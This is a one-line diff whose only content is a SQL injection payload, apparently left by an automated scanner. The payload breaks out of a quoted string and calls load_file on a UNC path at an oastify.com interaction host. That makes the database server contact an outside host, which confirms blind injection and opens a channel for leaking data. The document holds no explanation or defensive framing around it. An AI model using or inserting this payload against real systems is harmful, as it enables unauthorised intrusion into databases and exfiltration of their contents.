@@ -1,0 +1,1 @@
+bDJ81f35PB'+(select load_file('\\\\rkfhr0zdlp3i6nlqartie8szfqlj9de154twgp4e.oastify.com\\xwn'))+'
